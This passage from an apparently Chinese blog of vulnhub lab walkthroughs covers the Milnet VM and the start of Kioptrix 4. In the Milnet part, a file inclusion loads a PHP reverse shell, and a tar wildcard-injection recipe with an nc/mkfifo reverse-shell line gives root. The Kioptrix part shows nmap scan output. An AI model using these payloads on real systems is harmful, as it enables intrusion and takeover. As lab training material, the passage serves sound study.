  GET        8l       14w      145c http://192.1.1.136/<br>200      GET        5l       11w      110c http://192.1.1.136/content.php<br>200      GET      127l      336w    34456c http://192.1.1.136/mj.jpg<br>200      GET      700l     3645w    64174c http://192.1.1.136/info.php<br>200      GET      425l     1948w   128991c http://192.1.1.136/bomb.jpg<br>200      GET       28l      536w     3901c http://192.1.1.136/bomb.php<br>200      GET       12l       37w      253c http://192.1.1.136/props.php<br>403      GET       11l       26w      345c http://192.1.1.136/%7Echeckout%7E<br>[<span class="hljs-comment">####################] - 87s  1543892/1543892 0s      found:11      errors:2      </span><br>[<span class="hljs-comment">####################] - 87s  1543822/1543822 17765/s http://192.1.1.136/ </span><br></code></pre></td></tr></table></figure><h2 id="查看-web-界面"><a href="#查看-web-界面" class="headerlink" title="查看 web 界面"></a>查看 web 界面</h2><p>首先看默认界面，这里的图片也存在隐写的可能，如果没有别的攻击路径，也不要漏过对图片隐写进行检查</p><p><img src="/pic/ea66415414275bb2996956c414ecd6d4_MD5.png"></p><p><img src="/pic/3a8c212d4f0d58be94b8428e20ab2565_MD5.png"></p><p>左边的三个按钮是 <code>nav.php</code>，右边的图是 main.php，用 burp suite 抓包，分别点击三个按钮</p><p><img src="/pic/26eea85c243893b4ac12c116fbbb3333_MD5.png"></p><p><img src="/pic/d40067c7d12dee04b2cc24417403909d_MD5.png"></p><p>nav.php 调用了 content.php，使用的是 POST 方法，不同按钮提交的 POST 内容不同。bomb 返回的是一连串的原子弹制作文字教程。这里发现 post 提交的内容加上 php 的后缀正好是目录扫描结果中存在的文件，说明可能存在文件包含漏洞</p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>尝试 <code>../../../../../../../etc/passwd</code> 看看是否存在本地文件包含。返回结果为空，可能是默认加上了 <code>.php</code> 后缀。尝试远程文件包含。</p><p><img src="/pic/61540c7a4a093ec72444b5ea56ba5ad2_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/milnet/CVE-2018-15473]<br>└─$ vim php-reverse-shell.php<br><br>┌──(kali㉿kali)-[~/Downloads/milnet/CVE-2018-15473]<br>└─$ python -m http.server 8088                                                                           <br>Serving HTTP on 0.0.0.0 port 8088 (http://0.0.0.0:8088/) ...<br>192.1.1.136 - - [18/Jul/2023 04:37:07] <span class="hljs-string">&quot;GET /php-reverse-shell.php HTTP/1.0&quot;</span> 200 -<br></code></pre></td></tr></table></figure><p>反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 1234                 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 1234 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.136] 53824<br>Linux seckenheim.net.mil 4.4.0-22-generic <span class="hljs-comment">#40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br> 10:37:07 up 1 day,  5:04,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.01, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can t access <span class="hljs-built_in">tty</span>; job control turned off<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>/bin/sh: 1: python: not found<br>$ <span class="hljs-built_in">which</span> python2<br>$ <span class="hljs-built_in">which</span> python3<br>/usr/bin/python3<br>$ python3  -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@seckenheim:/$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@seckenheim:/$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>sudo: 3 incorrect password attempts<br>www-data@seckenheim:/$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux seckenheim.net.mil 4.4.0-22-generic <span class="hljs-comment">#40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@seckenheim:/$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:73:48:b8 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.136/24 brd 192.1.1.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::20c:29ff:fe73:48b8/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>www-data@seckenheim:/$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看网站目录下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@seckenheim:/var/www/html$ <span class="hljs-built_in">ls</span> -laih<br><span class="hljs-built_in">ls</span> -laih<br>total 132K<br>661465 drwxr-xr-x 2 www-data www-data 4.0K Jul 18 08:36 .<br>661464 drwxr-xr-x 3 root     root     4.0K May 21  2016 ..<br>661702 -rw-r--r-- 1 root     root      72K Aug  6  2015 bomb.jpg<br>661721 -rw-r--r-- 1 root     root     3.9K May 21  2016 bomb.php<br>661718 -rw-r--r-- 1 root     root      124 May 21  2016 content.php<br>657852 -rw-r--r-- 1 root     root     3.3K Jul 18 08:36 index.lighttpd.html<br>661713 -rw-r--r-- 1 root     root      145 May 21  2016 index.php<br>661709 -rw-r--r-- 1 www-data www-data   20 May 21  2016 info.php<br>661717 -rw-r--r-- 1 root     root      109 May 21  2016 main.php<br>661427 -rw-r--r-- 1 root     root      18K Jan 22  2012 mj.jpg<br>655384 -rw-r--r-- 1 root     root      532 May 21  2016 nav.php<br>655381 -rw-r--r-- 1 root     root      253 May 22  2016 props.php<br></code></pre></td></tr></table></figure><p>查看家目录文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@seckenheim:/home/langman$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 40K<br>1051087 drwxr-xr-x 4 langman langman 4.0K May 21  2016 .<br>1048577 drwxr-xr-x 3 root    root    4.0K May 21  2016 ..<br>1048584 -rw------- 1 langman langman    6 May 22  2016 .bash_history<br>1051088 -rw-r--r-- 1 langman langman  220 May 21  2016 .bash_logout<br>1051090 -rw-r--r-- 1 langman langman 3.7K May 21  2016 .bashrc<br>1048581 drwx------ 2 langman langman 4.0K May 21  2016 .cache<br>1051089 -rw-r--r-- 1 langman langman  675 May 21  2016 .profile<br>1048596 -rw------- 1 langman langman 4.4K May 21  2016 .viminfo<br>1048591 drwxrwxr-x 2 langman langman 4.0K May 21  2016 SDINET<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@seckenheim:/home/langman$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>*/1 *   * * *   root    /backup/backup.sh<br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>有定时任务 <code>/backup/backup.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@seckenheim:/$ <span class="hljs-built_in">ls</span> -liah /backup/backup.sh<br><span class="hljs-built_in">ls</span> -liah /backup/backup.sh<br>655377 -rw-r--r-x 1 root root 57 May 21  2016 /backup/backup.sh<br>www-data@seckenheim:/$ <span class="hljs-built_in">cat</span> /backup/backup.sh<br><span class="hljs-built_in">cat</span> /backup/backup.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html<br>tar cf /backup/backup.tgz *<br></code></pre></td></tr></table></figure><h3 id="tar-通配符提权"><a href="#tar-通配符提权" class="headerlink" title="tar 通配符提权"></a>tar 通配符提权</h3><p>tar 命令存在通配符，直接搜索 <code>tar 通配符 提权</code>，找到一篇博客：</p><p><a href="https://www.freebuf.com/articles/system/176255.html">利用通配符进行Linux本地提权 - FreeBuf网络安全行业门户</a></p><p>通配符注入的手法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp&quot;</span> &gt; shell.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; --checkpoint=1<br>tar cf archive.tar *<br></code></pre></td></tr></table></figure><p>提权成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/milnet]<br>└─$ sudo nc -lvnp 8888                 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 8888 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.136] 48100<br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span><br>credits.txt<br><span class="hljs-built_in">cat</span> credit.txt<br><span class="hljs-built_in">cat</span>: credit.txt: No such file or directory<br><span class="hljs-built_in">cat</span> credits.txt<br>        ,----,                                                               <br>      ,/   .`|                                                               <br>    ,`   .<span class="hljs-string">&#x27;  :  ,---,                          ,---,.                        </span><br><span class="hljs-string">  ;    ;     /,--.&#x27;</span> |                        ,<span class="hljs-string">&#x27;  .&#x27;</span> |                  ,---, <br>.<span class="hljs-string">&#x27;___,/    ,&#x27;</span> |  |  :                      ,---.<span class="hljs-string">&#x27;   |      ,---,     ,---.&#x27;</span>| <br>|    :     |  :  :  :                      |   |   .<span class="hljs-string">&#x27;  ,-+-. /  |    |   | : </span><br><span class="hljs-string">;    |.&#x27;</span>;  ;  :  |  |,--.   ,---.          :   :  |-, ,--.<span class="hljs-string">&#x27;|&#x27;</span>   |    |   | | <br>`----<span class="hljs-string">&#x27;  |  |  |  :  &#x27;</span>   |  /     \         :   |  ;/||   |  ,\<span class="hljs-string">&#x27; |  ,--.__| | </span><br><span class="hljs-string">    &#x27;</span>   :  ;  |  |   /<span class="hljs-string">&#x27; : /    /  |        |   :   .&#x27;</span>|   | /  | | /   ,<span class="hljs-string">&#x27;   | </span><br><span class="hljs-string">    |   |  &#x27;</span>  <span class="hljs-string">&#x27;  :  | | |.    &#x27;</span> / |        |   |  |-,|   | |  | |.   <span class="hljs-string">&#x27;  /  | </span><br><span class="hljs-string">    &#x27;</span>   :  |  |  |  <span class="hljs-string">&#x27; | :&#x27;</span>   ;   /|        <span class="hljs-string">&#x27;   :  ;/||   | |  |/ &#x27;</span>   ; |:  | <br>    ;   |.<span class="hljs-string">&#x27;   |  :  :_:,&#x27;</span><span class="hljs-string">&#x27;   |  / |        |   |    \|   | |--&#x27;</span>  |   | <span class="hljs-string">&#x27;/  &#x27;</span> <br>    <span class="hljs-string">&#x27;---&#x27;</span>     |  | ,<span class="hljs-string">&#x27;    |   :    |        |   :   .&#x27;</span>|   |/      |   :    :| <br>              `--<span class="hljs-string">&#x27;&#x27;</span>       \   \  /         |   | ,<span class="hljs-string">&#x27;  &#x27;</span>---<span class="hljs-string">&#x27;        \   \  /   </span><br><span class="hljs-string">                           `----&#x27;</span>          `----<span class="hljs-string">&#x27;                  `----\&#x27;</span>    <br>                                                                             <br><br>This was milnet <span class="hljs-keyword">for</span> <span class="hljs-comment">#vulnhub by @teh_warriar</span><br>I hope you enjoyed this vm!<br><br>If you liked it drop me a line on twitter or <span class="hljs-keyword">in</span> <span class="hljs-comment">#vulnhub.</span><br><br>I hope you found the clue:<br>/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt<br>I was sitting on the idea <span class="hljs-keyword">for</span> using this technique <span class="hljs-keyword">for</span> a BOOT2ROOT VM prives <span class="hljs-keyword">for</span> a long time...<br><br>This VM was inspired by The Cuckoo\<span class="hljs-string">&#x27;s Egg. </span><br><span class="hljs-string">If you have not read it give it a try:</span><br><span class="hljs-string">http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:73:48:b8 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.1.1.136/24 brd 192.1.1.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::20c:29ff:fe73:48b8/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kioptrix 4 靶机</title>
    <link href="/2023/07/d2c1d0d4a738.html"/>
    <url>/2023/07/d2c1d0d4a738.html</url>
    
    <content type="html"><![CDATA[<h1 id="Kioptrix-4-靶机"><a href="#Kioptrix-4-靶机" class="headerlink" title="Kioptrix 4 靶机"></a>Kioptrix 4 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.135    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 09:47 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.135<br>Host is up (0.0016s latency).                                                                                       <br>Not shown: 39528 closed tcp ports (reset), 26003 filtered tcp ports (no-response)                                   <br>PORT    STATE SERVICE                                                                                               <br>22/tcp  open  ssh                                                                                                   <br>80/tcp  open  http                                                                                                  <br>139/tcp open  netbios-ssn                                                                                           <br>445/tcp open  microsoft-ds                                                                                          <br>MAC Address: 00:0C:29:D5:52:BC (VMware)                                <br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.66 seconds<br></code></pre></td></tr></table></figure><p>开放了 22,80,139,445 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,139,445 192.1.1.135          <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 09:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.135<br>Host is up (0.00039s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)<br>|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)<br>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/<span class="hljs-number">5.2</span>.<span class="hljs-number">4</span>-<span class="hljs-number">2</span>ubuntu5.<span class="hljs-number">6</span> with Suhosin-Patch)<br>|_http-server-header: Apache/<span class="hljs-number">2.2</span>.<span class="hljs-number">8</span> (Ubuntu) PHP/<span class="hljs-number">5.2</span>.<span class="hljs-number">4</span>-<span class="hljs-number">2</span>ubuntu5.<span class="hljs-number">6</span> with Suhosin-Patch<br>|_http-title: Site doesn\&#x27;t have a title (text/html).<br><span class="hljs-number">139</span>/tcp open  netbios-ssn Samba smbd <span class="hljs-number">3</span>.X - <span class="hljs-number">4</span>.X (workgroup: WORKGROUP)<br><span class="hljs-number">445</span>/tcp open  netbios-ssn Samba smbd <span class="hljs-number">3.0</span>.<span class="hljs-number">28</span>a (workgroup: WORKGROUP)<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:D5:<span class="hljs-number">52</span>:BC (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Device type: general purpose<br>Running: Linux <span class="hljs-number">2.6</span>.X<br>OS CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">2.6</span><br>OS details: Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> - <span class="hljs-number">2.6</span>.<span class="hljs-number">33</span><br>Network Distance: <span class="hljs-number">1</span> hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_smb2-time: Protocol negotiation failed (SMB2)<br>| smb-os-discovery: <br>|   OS: Unix (Samba <span class="hljs-number">3.0</span>.<span class="hljs-number">28</span>a)<br>|   Computer name: Kioptrix4<br>|   NetBIOS computer name: <br>|   Domain name: localdomain<br>|   FQDN: Kioptrix4.localdomain<br>|_  System time: <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span>T17:<span class="hljs-number">50</span>:<span class="hljs-number">22</span>-<span class="hljs-number">04</span>:<span class="hljs-number">00</span><br>|_clock-skew: mean: <span class="hljs-number">10</span>h00m04s, deviation: <span class="hljs-number">2</span>h49m41s, median: <span class="hljs-number">8</span>h00m04s<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">49.43</span> seconds<br></code></pre></td></tr></table></figure><p>Debian 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sudo nmap --script=vuln -p22,80,139,445 192.1.1.135 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 09:51 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.135<br>Host is up (0.00028s latency).<br><br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>|_http-trace: TRACE is enabled<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_      http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /database.sql: Possible database backup</span><br><span class="hljs-string">|   /icons/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /index/: Potentially interesting folder</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 00:0C:29:D5:52:BC (VMware)<br><br>Host script results:<br>|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)<br>|_smb-vuln-ms10-061: <span class="hljs-literal">false</span><br>|_smb-vuln-ms10-054: <span 